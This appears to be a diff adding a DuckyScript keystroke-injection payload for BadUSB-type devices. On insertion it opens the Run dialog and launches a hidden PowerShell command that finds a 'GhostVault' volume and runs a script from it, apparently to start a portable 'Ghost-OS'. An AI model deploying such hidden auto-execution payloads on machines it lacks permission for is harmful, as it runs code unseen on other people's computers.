@@ -1,0 +1,12 @@
+REM ==============================================================================
+REM Ghost-OS Instant Auto-Launch DuckyScript Payload
+REM Works with USB Rubber Ducky, Flipper Zero, BadUSB, Raspberry Pi Pico (Pico-Ducky)
+REM Automatically detects the 'GhostVault' volume label and executes Launch-GhostOS.cmd
+REM in under 500 milliseconds upon physical insertion into a running Windows PC.
+REM ==============================================================================
+
+DELAY 300
+GUI r
+DELAY 150
+STRING powershell -NoP -NonI -W Hidden -C "$v=(Get-Volume -FileSystemLabel 'GhostVault' -ErrorAction SilentlyContinue); if($v){ & \"$($v.DriveLetter):\Launch-GhostOS.cmd\" }"
+ENTER
